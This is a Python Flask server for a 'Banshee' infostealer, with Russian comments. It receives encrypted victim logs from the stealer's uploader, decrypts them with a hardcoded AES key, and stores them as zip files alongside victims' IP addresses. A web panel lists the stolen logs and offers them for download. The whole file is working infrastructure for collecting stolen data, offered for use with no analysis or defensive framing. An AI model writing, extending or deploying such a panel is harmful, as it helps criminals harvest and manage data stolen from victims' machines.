#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Banshee Log Panel Server
Принимает зашифрованные логи от стиллера и расшифровывает их
"""

import os
import base64
import hashlib
import json
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from werkzeug.utils import secure_filename
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import ssl

app = Flask(__name__)

# Конфигурация
UPLOAD_FOLDER = Path('logs')
UPLOAD_FOLDER.mkdir(exist_ok=True)

# Ключ шифрования из HttpsFileUploader.cs
ENCRYPTION_KEY = base64.b64decode("8B88ANLP3/OKbt1OV//JNqa/gGYkbICtiLi0g/x/fQA=")

# База данных для хранения информации о логах
LOGS_DB = Path('logs_db.json')
if not LOGS_DB.exists():
    with open(LOGS_DB, 'w', encoding='utf-8') as f:
        json.dump([], f)


def decrypt_aes_cbc(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    """Расшифровывает данные AES-CBC с PKCS7 padding"""
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    
    # Удаляем PKCS7 padding
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data


def compute_sha256(data: bytes) -> str:
    """Вычисляет SHA256 хеш"""
    return hashlib.sha256(data).hexdigest()


def save_log_info(log_info: dict):
    """Сохраняет информацию о логе в базу данных"""
    logs = []
    if LOGS_DB.exists():
        with open(LOGS_DB, 'r', encoding='utf-8') as f:
            logs = json.load(f)
    
    logs.append(log_info)
    
    with open(LOGS_DB, 'w', encoding='utf-8') as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({"status": "ok", "timestamp": datetime.now().isoformat()}), 200


@app.route('/ping', methods=['GET'])
def ping():
    """Ping endpoint"""
    return jsonify({"status": "pong", "timestamp": datetime.now().isoformat()}), 200


@app.route('/upload', methods=['POST'])
def upload():
    """Принимает зашифрованный файл"""
    try:
        # Проверяем User-Agent
        user_agent = request.headers.get('User-Agent', '')
        if 'BansheeFinalUploader' not in user_agent:
            print(f"[WARNING] Unknown User-Agent: {user_agent}")
        
        # Получаем IV из заголовка или из начала файла
        iv_header = request.headers.get('X-IV')
        iv_base64 = request.headers.get('X-IV-Base64')
        iv = None
        
        # Получаем данные файла
        if 'file' in request.files:
            # Multipart form data
            file = request.files['file']
            encrypted_data = file.read()
            print(f"[DEBUG] Received multipart file, size: {len(encrypted_data)} bytes")
        else:
            # Raw data
            encrypted_data = request.get_data()
            print(f"[DEBUG] Received raw data, size: {len(encrypted_data)} bytes")
        
        # Пытаемся получить IV из заголовков
        if iv_base64:
            try:
                iv = base64.b64decode(iv_base64)
                print(f"[DEBUG] IV from X-IV-Base64 header: {len(iv)} bytes")
            except Exception as e:
                print(f"[WARNING] Failed to decode X-IV-Base64: {e}")
        elif iv_header:
            try:
                iv = bytes.fromhex(iv_header)
                print(f"[DEBUG] IV from X-IV header: {len(iv)} bytes")
            except Exception as e:
                print(f"[WARNING] Failed to decode X-IV: {e}")
        
        # Если IV не в заголовке, пытаемся взять из начала файла
        if iv is None:
            if len(encrypted_data) >= 16:
                iv = encrypted_data[:16]
                encrypted_data = encrypted_data[16:]
                print(f"[DEBUG] IV extracted from file start: {len(iv)} bytes")
            else:
                return jsonify({"error": "IV not found and file too small"}), 400
        
        if len(iv) != 16:
            return jsonify({"error": f"Invalid IV length: {len(iv)} (expected 16)"}), 400
        
        # Расшифровываем данные
        try:
            decrypted_data = decrypt_aes_cbc(encrypted_data, ENCRYPTION_KEY, iv)
        except Exception as e:
            return jsonify({"error": f"Decryption failed: {str(e)}"}), 400
        
        # Вычисляем хеш
        file_hash = compute_sha256(decrypted_data)
        
        # Сохраняем файл
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"log_{timestamp}_{file_hash[:8]}.zip"
        filepath = UPLOAD_FOLDER / filename
        
        with open(filepath, 'wb') as f:
            f.write(decrypted_data)
        
        # Сохраняем информацию о логе
        log_info = {
            "filename": filename,
            "hash": file_hash,
            "size": len(decrypted_data),
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote_addr,
            "user_agent": user_agent,
            "iv": base64.b64encode(iv).decode('utf-8')
        }
        save_log_info(log_info)
        
        print(f"[SUCCESS] Received and decrypted log: {filename} ({len(decrypted_data)} bytes)")
        
        return jsonify({
            "status": "success",
            "filename": filename,
            "hash": file_hash,
            "size": len(decrypted_data)
        }), 200
        
    except Exception as e:
        print(f"[ERROR] Upload failed: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500


@app.route('/', methods=['GET'])
def index():
    """Главная страница с веб-интерфейсом"""
    logs = []
    if LOGS_DB.exists():
        with open(LOGS_DB, 'r', encoding='utf-8') as f:
            logs = json.load(f)
    
    # Сортируем по времени (новые сначала)
    logs.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    # Форматируем размер файлов
    for log in logs:
        size = log.get('size', 0)
        if size < 1024:
            log['size_formatted'] = f"{size} B"
        elif size < 1024 * 1024:
            log['size_formatted'] = f"{size / 1024:.2f} KB"
        else:
            log['size_formatted'] = f"{size / (1024 * 1024):.2f} MB"
    
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Banshee Log Panel</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                background: white;
                border-radius: 10px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                overflow: hidden;
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                text-align: center;
            }
            .header h1 {
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            .header p {
                opacity: 0.9;
                font-size: 1.1em;
            }
            .stats {
                display: flex;
                justify-content: space-around;
                padding: 20px;
                background: #f8f9fa;
                border-bottom: 2px solid #e9ecef;
            }
            .stat-item {
                text-align: center;
            }
            .stat-value {
                font-size: 2em;
                font-weight: bold;
                color: #667eea;
            }
            .stat-label {
                color: #6c757d;
                margin-top: 5px;
            }
            .logs-table {
                padding: 20px;
                overflow-x: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th {
                background: #667eea;
                color: white;
                padding: 15px;
                text-align: left;
                font-weight: 600;
            }
            td {
                padding: 12px 15px;
                border-bottom: 1px solid #e9ecef;
            }
            tr:hover {
                background: #f8f9fa;
            }
            .badge {
                display: inline-block;
                padding: 5px 10px;
                border-radius: 20px;
                font-size: 0.85em;
                font-weight: 600;
            }
            .badge-success {
                background: #d4edda;
                color: #155724;
            }
            .download-btn {
                background: #667eea;
                color: white;
                padding: 8px 15px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: background 0.3s;
            }
            .download-btn:hover {
                background: #5568d3;
            }
            .no-logs {
                text-align: center;
                padding: 40px;
                color: #6c757d;
            }
            .refresh-btn {
                position: fixed;
                bottom: 30px;
                right: 30px;
                background: #667eea;
                color: white;
                border: none;
                padding: 15px 25px;
                border-radius: 50px;
                cursor: pointer;
                font-size: 1.1em;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                transition: transform 0.3s;
            }
            .refresh-btn:hover {
                transform: scale(1.1);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛡️ Banshee Log Panel</h1>
                <p>Панель управления логами</p>
            </div>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value">{{ total_logs }}</div>
                    <div class="stat-label">Всего логов</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{{ total_size }}</div>
                    <div class="stat-label">Общий размер</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">{{ last_log_time }}</div>
                    <div class="stat-label">Последний лог</div>
                </div>
            </div>
            <div class="logs-table">
                {% if logs %}
                <table>
                    <thead>
                        <tr>
                            <th>Время</th>
                            <th>Файл</th>
                            <th>Размер</th>
                            <th>Хеш</th>
                            <th>IP</th>
                            <th>Действия</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for log in logs %}
                        <tr>
                            <td>{{ log.timestamp }}</td>
                            <td>{{ log.filename }}</td>
                            <td>{{ log.size_formatted }}</td>
                            <td><code>{{ log.hash[:16] }}...</code></td>
                            <td>{{ log.ip }}</td>
                            <td>
                                <a href="/download/{{ log.filename }}" class="download-btn">Скачать</a>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
                {% else %}
                <div class="no-logs">
                    <h2>Логи пока не получены</h2>
                    <p>Ожидание загрузки логов от клиентов...</p>
                </div>
                {% endif %}
            </div>
        </div>
        <button class="refresh-btn" onclick="location.reload()">🔄 Обновить</button>
    </body>
    </html>
    """
    
    total_logs = len(logs)
    total_size = sum(log.get('size', 0) for log in logs)
    total_size_mb = f"{total_size / (1024*1024):.2f} MB"
    
    last_log_time = "Нет"
    if logs:
        last_time = logs[0].get('timestamp', '')
        if last_time:
            try:
                dt = datetime.fromisoformat(last_time.replace('Z', '+00:00'))
                last_log_time = dt.strftime("%H:%M:%S")
            except:
                last_log_time = last_time[:19] if len(last_time) > 19 else last_time
    
    return render_template_string(
        html,
        logs=logs,
        total_logs=total_logs,
        total_size=total_size_mb,
        last_log_time=last_log_time
    )


@app.route('/download/<filename>', methods=['GET'])
def download(filename):
    """Скачивание лога"""
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)


@app.route('/api/logs', methods=['GET'])
def api_logs():
    """API для получения списка логов"""
    logs = []
    if LOGS_DB.exists():
        with open(LOGS_DB, 'r', encoding='utf-8') as f:
            logs = json.load(f)
    
    logs.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    return jsonify(logs), 200


if __name__ == '__main__':
    print("=" * 60)
    print("Banshee Log Panel Server")
    print("=" * 60)
    print(f"Upload folder: {UPLOAD_FOLDER.absolute()}")
    print(f"Logs database: {LOGS_DB.absolute()}")
    print("\nEndpoints:")
    print("  GET  /              - Web interface")
    print("  POST /upload        - Upload encrypted log")
    print("  GET  /health        - Health check")
    print("  GET  /ping          - Ping")
    print("  GET  /api/logs      - API: Get all logs")
    print("  GET  /download/<file> - Download log file")
    print("\nStarting server on https://0.0.0.0:8443")
    print("=" * 60)
    
    # Для HTTPS нужны сертификаты
    # Можно использовать самоподписанный сертификат
    context = None
    cert_file = Path('server.crt')
    key_file = Path('server.key')
    
    if cert_file.exists() and key_file.exists():
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        print("SSL certificates found, using HTTPS")
    else:
        print("WARNING: SSL certificates not found, using HTTP")
        print("To enable HTTPS, generate certificates:")
        print("  openssl req -x509 -newkey rsa:4096 -nodes -keyout server.key -out server.crt -days 365")
    
    app.run(
        host='0.0.0.0',
        port=8443,
        ssl_context=context,
        debug=True
    )

